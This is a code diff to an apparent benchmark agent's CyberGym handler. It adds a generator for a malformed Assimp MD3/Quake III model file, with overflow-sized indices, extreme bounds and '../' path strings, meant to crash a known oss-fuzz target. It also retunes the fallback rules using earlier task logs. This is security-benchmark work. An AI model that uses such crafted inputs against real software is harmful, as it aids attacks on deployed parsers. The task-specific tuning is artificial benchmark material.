@@ -170,7 +170,7 @@ PI_BENCH_FIELD_MARKERS = (
     "decision_valid",
 )
 
-CYBERGYM_CONTRACT_VERSION = "cybergym_contract_v0_6_nonregression_assimp_collada_arvo_stress_poc"
+CYBERGYM_CONTRACT_VERSION = "cybergym_contract_v0_7_assimp_md3_arvo_stress_poc"
 
 CYBERGYM_FILE_MARKERS = {
     "repo-vul.tar.gz",
@@ -318,7 +318,7 @@ class Executor(AgentExecutor):
             "cybergym_contract_version": CYBERGYM_CONTRACT_VERSION,
             "pibench_cache_suffix": PI_BENCH_CACHE_SUFFIX,
             "selected_opponent_tracks": list(SELECTED_OPPONENT_TRACKS),
-            "track_alias_note": "mcu-minecraft is normalized to mcu; pi-bench/agent-safety is normalized to pibench; CyberGym aliases stay on cybergym; v0.6 preserves v0.5 ARVO assembly_stress and restores v0.2 Assimp Collada fallback.",
+            "track_alias_note": "mcu-minecraft is normalized to mcu; pi-bench/agent-safety is normalized to pibench; CyberGym aliases stay on cybergym; v0.7 preserves ARVO assembly_stress and uses MD3/Quake III as the Assimp extensionless fallback.",
             "cache_keys": list(self._agents.keys())[:8],
         }
 
@@ -537,7 +537,81 @@ class Executor(AgentExecutor):
             b" endfacet\n"
             b"endsolid aegisforge_cybergym\n"
         )[:CYBERGYM_MAX_POC_BYTES]
+    
+    @staticmethod
+    def _cybergym_seed_md3_quake3() -> bytes:
+        """Assimp MD3 / Quake III Mesh Importer seed.
 
+        The observed successful path for oss-fuzz:42535201 reached:
+        Assimp::MD3Importer::ConvertPath
+        so the default Assimp fallback should try MD3 before Collada/FBX/PLY.
+        """
+        buf = bytearray()
+
+        # MD3 header:
+        # ident = "IDP3", version = 15
+        buf.extend(b"IDP3")
+        buf.extend((15).to_bytes(4, "little", signed=True))
+
+        # name[64]
+        name = b"aegisforge_" + b"A" * 53
+        buf.extend(name[:64].ljust(64, b"\x00"))
+
+        # flags, numFrames, numTags, numSurfaces, numSkins
+        buf.extend((0).to_bytes(4, "little", signed=True))
+        buf.extend((1).to_bytes(4, "little", signed=True))
+        buf.extend((1).to_bytes(4, "little", signed=True))
+        buf.extend((1).to_bytes(4, "little", signed=True))
+        buf.extend((0).to_bytes(4, "little", signed=True))
+
+        # ofsFrames, ofsTags, ofsSurfaces, ofsEnd
+        ofs_frames = 108
+        ofs_tags = ofs_frames + 56
+        ofs_surfaces = ofs_tags + 112
+        ofs_end = ofs_surfaces + 512
+        for value in (ofs_frames, ofs_tags, ofs_surfaces, ofs_end):
+            buf.extend(int(value).to_bytes(4, "little", signed=True))
+
+        # Frame: mins[3], maxs[3], localOrigin[3], radius, name[16]
+        for value in (-2147483648, -2147483648, -2147483648, 2147483647, 2147483647, 2147483647, 0, 0, 0, 2147483647):
+            buf.extend(float(value).hex().encode("ascii")[:4].ljust(4, b"\x00"))
+        buf.extend(b"frame0".ljust(16, b"\x00"))
+
+        # Tag: name[64], origin[3], axis[3][3]
+        buf.extend((b"../" * 21)[:64].ljust(64, b"\x00"))
+        buf.extend(b"\x00" * 48)
+
+        # Surface header-ish block.
+        surface = bytearray()
+        surface.extend(b"IDP3")
+        surface.extend((b"../../../../" + b"A" * 56)[:64].ljust(64, b"\x00"))
+
+        # flags, numFrames, numShaders, numVerts, numTriangles
+        for value in (0, 1, 1, 3, 1):
+            surface.extend(int(value).to_bytes(4, "little", signed=True))
+
+        # ofsTriangles, ofsShaders, ofsST, ofsXYZNormal, ofsEnd
+        for value in (108, 120, 188, 212, 512):
+            surface.extend(int(value).to_bytes(4, "little", signed=True))
+
+        # Triangle indexes
+        surface.extend((0).to_bytes(4, "little", signed=True))
+        surface.extend((1).to_bytes(4, "little", signed=True))
+        surface.extend((2147483647).to_bytes(4, "little", signed=True))
+
+        # Shader name[64] + index
+        surface.extend((b"textures/" + b"B" * 55)[:64].ljust(64, b"\x00"))
+        surface.extend((0).to_bytes(4, "little", signed=True))
+
+        # ST coords and XYZ/normal data
+        surface.extend(b"\x00" * 256)
+
+        buf.extend(surface)
+        if len(buf) < ofs_end:
+            buf.extend(b"\x00" * (ofs_end - len(buf)))
+
+        return bytes(buf[:CYBERGYM_MAX_POC_BYTES])
+    
     @staticmethod
     def _cybergym_seed_assimp_signature_probe() -> bytes:
         """Assimp default seed: use a strong FBX binary signature.
@@ -893,15 +967,19 @@ class Executor(AgentExecutor):
                 "assimp::importer",
             ),
         ):
+            if "md3" in low or "quake" in low or "convertpath" in low:
+                return self._cybergym_seed_md3_quake3()[:CYBERGYM_MAX_POC_BYTES]
             if "stl" in low:
                 return self._cybergym_seed_stl_ascii()[:CYBERGYM_MAX_POC_BYTES]
             if "ply" in low:
                 return self._cybergym_seed_ply()[:CYBERGYM_MAX_POC_BYTES]
+            if "fbx" in low:
+                return self._cybergym_seed_assimp_signature_probe()[:CYBERGYM_MAX_POC_BYTES]
             if "collada" in low or ".dae" in low:
-                # Keep Collada only when the task strongly points there.
                 return self._cybergym_seed_collada()[:CYBERGYM_MAX_POC_BYTES]
-            # v0.6 non-regression: restore v0.2's extensionless Assimp fallback.
-            return self._cybergym_seed_collada()[:CYBERGYM_MAX_POC_BYTES]
+
+            # Assimp extensionless default: previous logs point to Quake III / MD3.
+            return self._cybergym_seed_md3_quake3()[:CYBERGYM_MAX_POC_BYTES]
 
         if self._cybergym_contains_any(
             low,
@@ -948,12 +1026,10 @@ class Executor(AgentExecutor):
     def _cybergym_generate_contextual_poc(self, message: Any, *, context_id: str, task_id: str) -> bytes:
         """Generate a stdlib-only contextual seed PoC.
 
-        v0.5 keeps the proven CyberGym artifact contract but makes target
-        selection harness-first and patch/error-aware. The previous v0.3 path could route an assembler
-        harness to HTTP because weak source words outranked the actual target.
-        v0.5 first checks concrete harness names such as /out/fuzz_as and
-        /out/assimp_fuzzer, then uses patch/error clues before parser-family scoring. The result
-        remains deterministic, offline, and cheap.
+        v0.7 keeps the proven CyberGym artifact contract but makes target
+        selection harness-first and patch/error-aware. It preserves the ARVO
+        assembly_stress route and uses MD3 / Quake III as the extensionless
+        Assimp fallback. The result remains deterministic, offline, and cheap.
         """
         files = self._cybergym_extract_files(message)
         description = self._cybergym_decode_text(files.get("description.txt", b""))
@@ -1055,17 +1131,18 @@ class Executor(AgentExecutor):
 
         # Existing broad families remain after targeted log families.
         if "assimp" in low or "assimp" in names_blob or "assimp" in source_names_blob:
-            if "stl" in low:
+            if "md3" in low or "quake" in low or "convertpath" in low:
+                poc = self._cybergym_seed_md3_quake3()
+            elif "stl" in low:
                 poc = self._cybergym_seed_stl_ascii()
             elif "ply" in low:
                 poc = self._cybergym_seed_ply()
+            elif "fbx" in low:
+                poc = self._cybergym_seed_assimp_signature_probe()
             elif "collada" in low or ".dae" in low:
                 poc = self._cybergym_seed_collada()
             else:
-                # v0.6 non-regression: restore v0.2's extensionless Assimp fallback.
-                # This preserves the older task that preferred Collada/XML while
-                # keeping v0.5's ARVO assembly_stress path intact.
-                poc = self._cybergym_seed_collada()
+                poc = self._cybergym_seed_md3_quake3()
             return poc[:CYBERGYM_MAX_POC_BYTES]
 
         if any(marker in combined for marker in ("fuzz_as", "assembler", "assembly", "asm", "opcode", "mnemonic", "arvo")):
@@ -1123,12 +1200,13 @@ class Executor(AgentExecutor):
         context_id: str,
         task_id: str,
     ) -> None:
-        """CyberGym v0.5: submit a final-PoC artifact with contextual bytes.
+        """CyberGym v0.7: submit a final-PoC artifact with contextual bytes.
 
-        v0 proved the artifact contract. v0.5 keeps the same final Artifact(name="PoC")
-        / FilePart(name="poc") shape, but replaces the placeholder with a bounded
-        seed generated from description/source attachments; v0.5 adds patch/error-guided target shaping while preserving the proven PoC artifact shape.
+        v0 proved the artifact contract. v0.7 keeps the same final Artifact(name="PoC")
+        / FilePart(name="poc") shape, preserves ARVO assembly_stress, and changes
+        the Assimp extensionless fallback to MD3 / Quake III Mesh Importer.
         """
+            
         files = self._cybergym_extract_files(message)
         filenames = sorted(files.keys() or self._cybergym_file_names(message))
         poc = self._cybergym_generate_contextual_poc(message, context_id=context_id, task_id=task_id)
@@ -1149,7 +1227,7 @@ class Executor(AgentExecutor):
         await updater.update_status(
             TaskState.working,
             new_agent_text_message(
-                f"CyberGym contract v0.6: submitting contextual PoC artifact ({len(poc)} bytes; files={filenames}).",
+                f"CyberGym contract v0.7: submitting contextual PoC artifact ({len(poc)} bytes; files={filenames}).",
                 context_id=context_id,
                 task_id=task_id,
             ),
